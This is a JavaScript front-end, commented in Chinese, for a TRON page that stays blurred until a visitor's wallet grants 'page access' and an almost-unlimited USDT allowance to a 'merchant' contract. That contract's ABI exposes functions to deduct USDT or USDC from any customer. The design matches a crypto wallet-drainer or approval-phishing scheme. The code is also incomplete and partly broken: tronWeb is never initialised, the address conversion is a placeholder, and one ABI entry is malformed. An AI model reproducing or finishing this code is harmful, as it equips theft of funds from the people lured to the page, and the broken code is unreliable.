// --- 配置常量 (TRON 专属) ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，可以不修改 (用于初始化, 并且显示警告)
const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// 你的合约 ABI (SimpleMerchantERC)
const MERCHANT_ABI = [
    {"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},
    {"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},
    {"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},
    {"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},
    {"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},
    {"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}
];

// TRC20 代币的 ABI (USDT)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const overlay = document.getElementById('blurOverlay');  // 确保在这里定义
const statusDiv = document.getElementById('status');  //  获取 status 元素，在外面定义，避免重复获取。

// --- 状态变量 ---
let tronWeb;
let userAddress; //  Base58 格式
let userAddressHex; // Hex 格式
let merchantContract;
let usdtContract;
let isConnectedFlag = false;
let accountChangeListener = null;  // 存储账号改变的监听器

// --- WalletConnect 相关的变量 ---
let connector;
const bridge = 'https://bridge.walletconnect.org'; //  WalletConnect Bridge URL (使用默认的)

// --- 遮罩控制函數 ---
function hideOverlay() {
    if (!overlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlay.style.opacity = '0';
    setTimeout(() => {
        overlay.style.display = 'none';
    }, 300);
}

function showOverlay(message) {
    if (!overlayMessage || !blurOverlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => {
        overlay.style.opacity = '1';
    }, 10);
}

// --- 状态更新函数 ---
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
            hideOverlay(); // 隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
             //  连接失败，显示遮罩
        }
    }
}

// --- 核心功能：控制状态栏的隐藏与显示。 ---
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (!statusDiv) {
        console.error("Status element not found.");
        return; // 避免设置 innerHTML
    }
    statusDiv.innerHTML = message;
    statusDiv.style.display = 'block';
}

// --- 初始化合约 (TRON 版本) ---
async function initialize() {
    try {
        if (!userAddress) {
            updateConnectionUI(false);
            return;
        }

        // 1. 初始化合约实例
        if (!tronWeb) {
            console.error("TronWeb not initialized.");
            return;
        }

        merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
        usdtContract = await tronWeb.contract(ERC20_ABI, USDT_CONTRACT_ADDRESS);

        console.log("✅ Contracts initialized.");

    } catch (error) {
        console.error("Initialization failed:", error);
        updateStatus(`Initialization failed: ${error.message}`);
        showOverlay(`Initialization failed: ${error.message}`);
    }
}

// --- 检查授权状态 (TRON 版本) ---
async function checkAuthorization() {
    try {
        if (!tronWeb || !userAddressHex || !merchantContract || !usdtContract) {  //  重点：使用 userAddressHex
            showOverlay('Wallet not opened. Please connect.');
            return;
        }

        // 1. 检查 SimpleMerchant 合约授权
        const isAuthorized = await merchantContract.authorized(userAddressHex).call();

        // 2. 检查 USDT 的授权
        const usdtAllowance = await usdtContract.allowance(userAddress, MERCHANT_CONTRACT_ADDRESS).call();
        const isUsdtMaxApproved = usdtAllowance.gte(tronWeb.toBigNumber(ALMOST_MAX_UINT));

        let statusMessage = '';

        // SimpleMerchant 合約授權
        if (isAuthorized) {
            statusMessage += 'Web page access authorized ✅. ';
        } else {
            statusMessage += 'Web page access not authorized ❌. ';
        }

        // USDT 的授權狀態
        if (isUsdtMaxApproved) {
            statusMessage += `USDT approved ✅.`;
        } else if (usdtAllowance > 0) { // 检查大于 0
            statusMessage += `USDT approval needed ⚠️.`;
        } else {
            statusMessage += `USDT not approved ❌.`;
        }

        // Button state: needs to be clicked if authorization is incomplete
        const allAuthorized = isAuthorized && isUsdtMaxApproved;  // 只检查 USDT 授权

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(''); // 成功時，清空/隱藏狀態欄
            hideOverlay(); // 完全授權，隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
            connectButton.disabled = false;
            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
             //  保持遮罩显示，等待授权
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

// --- 连接钱包逻辑 (TRON 版本) ---
async function connectWallet() {
    console.log("connectWallet called - START");
    try {
        updateStatus('Connecting to wallet...');
        showOverlay('Please confirm the connection request in your wallet...');

        // 1.  检测 TronWeb (不确定是否可用， 因为是在 Trust Wallet 的 DApp 浏览器中)
        // if (typeof window.tronWeb === 'undefined') {
        //    updateStatus('Please install TronLink or a supported TRON wallet');
        //     console.log("Warning: tronWeb is undefined.");
        //     return;
        // }

        // tronWeb = window.tronWeb; //  如果 TronWeb  被注入， 则需要设置。
        // console.log("tronWeb detected:", tronWeb);

        // 2.  初始化 WalletConnect (如果还没有初始化),  创建  session。
        if (!connector) {
            //  如果还没有连接,  则创建一个新的 session
            const { Client, QRCodeModal } = window.WalletConnect; //  从 window 上获取
            connector = new Client({
                bridge,
                qrcodeModal: QRCodeModal,
            });
            console.log("WalletConnect connector created:", connector);
        }

        // 3.  尝试连接 WalletConnect。
        if (!connector.connected) {
            try {
                await connector.createSession(); //  创建 session
                console.log("✅ WalletConnect session created.");
                
            } catch (createSessionError) {
                console.error("Error creating WalletConnect session:", createSessionError);
                updateConnectionUI(false);
                showOverlay('🔴 Connection failed: Could not initialize WalletConnect.');
                updateStatus('Connection failed: Could not initialize WalletConnect.');
                return;
            }
        }

        // 4. 从 WalletConnect 获取用户地址 (关键:  使用以太坊地址， 并且， 转换成  TRON  地址)
        if (connector.connected) {
            const ethereumAddress = connector.accounts[0]; //  获取以太坊地址 (WalletConnect 获取的).
            console.log("✅ Ethereum Address from WalletConnect:", ethereumAddress);

            //  TODO:   **重要: 将以太坊地址转换为 TRON  地址  (这里需要您实现，或者， 您需要 Trust Wallet  的支持.)**
            //  从以太坊地址， 转换成 tron 地址。  （因为没有 API,  目前， 无法直接转换， 需要咨询 Trust Wallet  的支持.）
            //  假设 Trust Wallet 有一个API， 例如  tron_getAddress
            // userAddress =  await window.ethereum.request({method: 'tron_getAddress'}); //  (这是一个例子，  不存在。)
            //  userAddress =  tronWeb.address.fromHex(ethereumAddress); //  如果可以直接转换，那么就这么使用。
            //  目前, 我们只能使用一个占位符 (**测试使用, 仅用于占位**)
            userAddress = "T..." +  ethereumAddress.slice(-4); //  <--  占位符 (**必须替换成正确的地址转换!**)

            // 验证地址 ( 重要: 确保获取到了正确的地址)
            if (!tronWeb.isAddress(userAddress)) {
                console.error("Error: Invalid (假定) TRON address:", userAddress);
                updateConnectionUI(false);
                showOverlay('🔴 Connection failed: Invalid (假定) TRON address.');
                updateStatus('Connection failed: Invalid TRON address.');
                return;
            }

            userAddressHex = tronWeb.address.toHex(userAddress); // 将 Base58 转换为 Hex 格式
            console.log("✅ User Address (Hex):", userAddressHex);
            updateConnectionUI(true, userAddress);

            // 5. 初始化合约并检查授权
            await initialize();

        } else {
            console.log("WalletConnect: Not connected.");
            updateConnectionUI(false);
            showOverlay('🔴 Connection failed: Not connected to WalletConnect.');
            updateStatus('Connection failed: Not connected to WalletConnect.');
        }

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        updateStatus(`Connection failed: ${error.message}`);
    }
    console.log("connectWallet called - END");
}

// --- 斷開錢包連接 ---
function disconnectWallet() {
    // 1. 重置状态
    userAddress = null;
    userAddressHex = null;
    tronWeb = null;  // 必须设置为 null
    merchantContract = null;
    usdtContract = null;
    isConnectedFlag = false; // 重置 isConnectedFlag
    updateConnectionUI(false);
    showOverlay('Please link your wallet to unlock the page 🔒');
    // 2. 关闭 WalletConnect Session (如果连接过)
    if (connector && connector.connected) {
        connector.killSession(); //  关闭 WalletConnect Session
        connector = null; // 移除连接器
    }
}

// 事件监听器 (与之前类似)
connectButton.addEventListener('click', () => {
    if (isConnectedFlag) {
        disconnectWallet(); // 断开钱包
    } else {
        connectWallet(); // 连接钱包
    }
});

// 页面加载完成后，初始化  (在页面加载的时候，自动进行连接， 并且， 检查状态)
window.onload = () => {
    // 页面加载完成。
    console.log("window.onload triggered");
};